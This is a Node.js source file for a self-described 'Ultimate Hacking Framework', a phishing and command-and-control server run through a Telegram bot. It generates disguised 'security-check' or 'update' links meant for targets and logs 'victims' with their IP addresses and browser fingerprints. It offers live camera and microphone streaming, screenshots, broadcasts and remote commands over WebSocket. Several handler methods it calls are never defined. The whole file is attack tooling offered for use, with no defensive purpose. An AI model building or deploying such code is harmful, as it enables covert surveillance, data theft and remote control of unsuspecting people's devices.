hereconst express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const compression = require('compression');
const helmet = require('helmet');

class UltimateHackingFramework {
    constructor() {
        this.app = express();
        this.bot = null;
        this.wss = null;
        this.db = null;
        this.victims = new Map();
        this.config = this.loadConfig();
        this.stats = {
            totalVictims: 0,
            activeSessions: 0,
            dataCollected: 0,
            startTime: Date.now()
        };
        
        this.init();
    }

    async init() {
        try {
            await this.setupDatabase();
            this.setupMiddleware();
            this.setupSecurity();
            this.setupBot();
            this.setupWebSocket();
            this.setupRoutes();
            this.startServer();
            this.startCleanupJob();
            
            console.log('🔥 Ultimate Hacking Framework Started Successfully');
        } catch (error) {
            console.error('❌ Initialization failed:', error);
        }
    }

    setupMiddleware() {
        // Compression for faster loading
        this.app.use(compression());
        
        // Enhanced body parsing
        this.app.use(express.json({ limit: '100mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '100mb' }));
        
        // Static files with cache
        this.app.use(express.static('public', {
            maxAge: '1d',
            etag: false
        }));
        
        this.app.set('view engine', 'ejs');
        this.app.set('views', path.join(__dirname, 'views'));
    }

    setupSecurity() {
        // Advanced security headers
        this.app.use(helmet({
            contentSecurityPolicy: false,
            crossOriginEmbedderPolicy: false
        }));
        
        // Custom stealth headers
        this.app.use((req, res, next) => {
            res.removeHeader('X-Powered-By');
            res.setHeader('X-Content-Type-Options', 'nosniff');
            res.setHeader('X-Frame-Options', 'SAMEORIGIN');
            res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
            res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
            next();
        });

        // Rate limiting
        const limiter = rateLimit({
            windowMs: 1 * 60 * 1000, // 1 minute
            max: 100, // limit each IP to 100 requests per windowMs
            message: 'Too many requests from this IP'
        });
        this.app.use(limiter);
    }

    async setupDatabase() {
        return new Promise((resolve, reject) => {
            this.db = new sqlite3.Database('database/victims.db', (err) => {
                if (err) {
                    reject(err);
                } else {
                    console.log('✅ Database connected');
                    this.createTables();
                    resolve();
                }
            });
        });
    }

    createTables() {
        this.db.run(`CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            ip TEXT,
            user_agent TEXT,
            country TEXT,
            browser TEXT,
            platform TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_activity DATETIME,
            status TEXT DEFAULT 'active',
            data_collected INTEGER DEFAULT 0
        )`);

        this.db.run(`CREATE TABLE IF NOT EXISTS victim_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            data_type TEXT,
            data TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )`);

        this.db.run(`CREATE TABLE IF NOT EXISTS media_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            media_type TEXT,
            file_path TEXT,
            file_size INTEGER,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )`);
    }

    setupBot() {
        try {
            this.bot = new TelegramBot(this.config.botToken, {
                polling: true,
                request: {
                    agentOptions: {
                        keepAlive: true,
                        family: 4
                    }
                }
            });
            
            this.setupBotCommands();
            console.log('✅ Telegram Bot Activated');
        } catch (error) {
            console.error('❌ Bot setup failed:', error);
        }
    }

    setupBotCommands() {
        this.bot.onText(/\/start/, (msg) => this.handleStart(msg));
        this.bot.onText(/\/create (.+)/, (msg, match) => this.handleCreate(msg, match[1]));
        this.bot.onText(/\/victims/, (msg) => this.handleVictims(msg));
        this.bot.onText(/\/stats/, (msg) => this.handleStats(msg));
        this.bot.onText(/\/stream (.+)/, (msg, match) => this.handleStream(msg, match[1]));
        this.bot.onText(/\/screenshot (.+)/, (msg, match) => this.handleScreenshot(msg, match[1]));
        this.bot.onText(/\/broadcast (.+)/, (msg, match) => this.handleBroadcast(msg, match[1]));
        this.bot.onText(/\/cleanup/, (msg) => this.handleCleanup(msg));
    }

    setupWebSocket() {
        this.wss = new WebSocket.Server({ port: 8080 });
        this.wss.on('connection', (ws) => {
            ws.on('message', (message) => this.handleWSMessage(ws, message));
            ws.on('close', () => this.handleWSClose(ws));
        });
        console.log('✅ WebSocket Server Started');
    }

    setupRoutes() {
        // Page routes
        this.app.use(require('./routes/pages'));
        
        // API routes
        this.app.use('/api', require('./routes/api'));
        
        // Webhook routes
        this.app.use('/webhook', require('./routes/webhook'));
    }

    startServer() {
        const PORT = process.env.PORT || 3000;
        this.app.listen(PORT, () => {
            console.log(`🚀 Server running on port ${PORT}`);
            console.log(`🌐 Access URL: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
        });
    }

    startCleanupJob() {
        // Cleanup every hour
        setInterval(() => {
            this.cleanupOldData();
        }, 3600000);
    }

    async cleanupOldData() {
        const cutoff = new Date(Date.now() - (this.config.dataRetentionDays * 24 * 60 * 60 * 1000));
        
        this.db.run("DELETE FROM victims WHERE last_activity < ?", [cutoff.toISOString()], (err) => {
            if (!err) console.log('🧹 Cleaned up old victim data');
        });
    }

    // Enhanced victim management
    async createVictim(ip, userAgent) {
        const victimId = this.generateVictimId();
        const geo = await this.getGeoInfo(ip);
        
        const victim = {
            id: victimId,
            ip: ip,
            userAgent: userAgent,
            country: geo.country,
            browser: this.parseBrowser(userAgent),
            platform: this.parsePlatform(userAgent),
            createdAt: new Date(),
            lastActivity: new Date(),
            status: 'active',
            data: {}
        };
        
        // Store in database
        this.db.run(
            `INSERT INTO victims (id, ip, user_agent, country, browser, platform) VALUES (?, ?, ?, ?, ?, ?)`,
            [victimId, ip, userAgent, geo.country, victim.browser, victim.platform]
        );
        
        this.victims.set(victimId, victim);
        this.stats.totalVictims++;
        this.stats.activeSessions++;
        
        return victimId;
    }

    generateVictimId() {
        return 'v' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
    }

    async getGeoInfo(ip) {
        try {
            // Simple geo lookup - you can integrate with a geo API
            return {
                country: 'Unknown',
                city: 'Unknown',
                isp: 'Unknown'
            };
        } catch (error) {
            return {
                country: 'Unknown',
                city: 'Unknown', 
                isp: 'Unknown'
            };
        }
    }

    parseBrowser(userAgent) {
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown';
    }

    parsePlatform(userAgent) {
        if (userAgent.includes('Windows')) return 'Windows';
        if (userAgent.includes('Mac')) return 'MacOS';
        if (userAgent.includes('Linux')) return 'Linux';
        if (userAgent.includes('Android')) return 'Android';
        if (userAgent.includes('iPhone')) return 'iOS';
        return 'Unknown';
    }

    // Bot command handlers
    async handleStart(msg) {
        const welcomeMsg = `🕵️ ULTIMATE HACKING FRAMEWORK v5.0

🔥 Advanced Commands:
/create [url] - Create phishing link
/victims - List active victims
/stats - System statistics
/stream [id] - Live media stream
/screenshot [id] - Capture screenshot
/broadcast [msg] - Broadcast to all victims
/cleanup - Clean old data

📊 System Status:
Victims: ${this.stats.totalVictims}
Active: ${this.stats.activeSessions}
Uptime: ${Math.floor((Date.now() - this.stats.startTime) / 3600000)}h

⚡ Replit Optimized | Real-time C2`;

        this.bot.sendMessage(msg.chat.id, welcomeMsg);
    }

    async handleCreate(msg, targetUrl) {
        const attackTypes = ['security-check', 'verification', 'update', 'awareness'];
        const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
        
        const encodedUrl = Buffer.from(targetUrl).toString('base64');
        const shortId = Math.random().toString(36).substr(2, 6);
        
        const phishingUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/${attackType}/${encodedUrl}?id=${shortId}`;
        
        const response = `🎣 PHISHING LINK CREATED

🔗 Target: ${targetUrl}
🎭 Attack: ${attackType.toUpperCase()}
📊 ID: ${shortId}

🌐 Phishing URL:
${phishingUrl}

📈 Expected Data:
✅ Camera Access
✅ Microphone Recording  
✅ GPS Location
✅ Device Fingerprint
✅ Browser Data
✅ Behavioral Analytics

⚡ Send this link to your target`;

        this.bot.sendMessage(msg.chat.id, response);
    }

    async handleVictims(msg) {
        this.db.all("SELECT * FROM victims WHERE status = 'active' ORDER BY last_activity DESC LIMIT 10", (err, rows) => {
            if (err) {
                this.bot.sendMessage(msg.chat.id, "❌ Error fetching victims");
                return;
            }

            if (rows.length === 0) {
                this.bot.sendMessage(msg.chat.id, "📭 No active victims");
                return;
            }

            let victimsList = `👥 ACTIVE VICTIMS (${rows.length})\n\n`;
            
            rows.forEach((victim, index) => {
                victimsList += `${index + 1}. ${victim.id}\n`;
                victimsList += `   🌐 ${victim.browser} on ${victim.platform}\n`;
                victimsList += `   📍 ${victim.country} | 🕒 ${new Date(victim.last_activity).toLocaleTimeString()}\n`;
                victimsList += `   📊 Data: ${victim.data_collected} items\n\n`;
            });

            this.bot.sendMessage(msg.chat.id, victimsList);
        });
    }

    async handleStats(msg) {
        this.db.get("SELECT COUNT(*) as total, COUNT(CASE WHEN status = 'active' THEN 1 END) as active FROM victims", (err, row) => {
            const statsMsg = `📊 SYSTEM STATISTICS

🎯 Total Victims: ${row.total}
🔴 Active Sessions: ${row.active}
💾 Data Collected: ${this.stats.dataCollected} items
🕐 Uptime: ${Math.floor((Date.now() - this.stats.startTime) / 3600000)} hours
🌐 Server: Replit ${process.env.REPL_SLUG}

⚡ Performance: Optimal
🛡️ Security: Stealth Mode Active
🔗 C2: Real-time WebSocket`;

            this.bot.sendMessage(msg.chat.id, statsMsg);
        });
    }

    handleWSMessage(ws, message) {
        try {
            const data = JSON.parse(message);
            
            switch(data.type) {
                case 'victim_connect':
                    this.handleVictimConnection(ws, data);
                    break;
                case 'media_stream':
                    this.broadcastToAttacker(data.victimId, data);
                    break;
                case 'data_update':
                    this.updateVictimData(data.victimId, data.payload);
                    break;
                case 'remote_command':
                    this.executeRemoteCommand(data.victimId, data.command);
                    break;
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    }

    loadConfig() {
        try {
            return JSON.parse(fs.readFileSync('config.json', 'utf8'));
        } catch (error) {
            console.error('Config load error, using defaults');
            return {
                botToken: process.env.BOT_TOKEN,
                adminChatId: process.env.ADMIN_CHAT_ID,
                dataRetentionDays: 7,
                maxVictims: 1000
            };
        }
    }
}

// Start the framework
new UltimateHackingFramework();

// Keep alive for Replit
setInterval(() => {
    if (Math.random() < 0.1) { // 10% chance to log
        console.log('🟢 Framework Active -', new Date().toISOString());
    }
}, 30000);
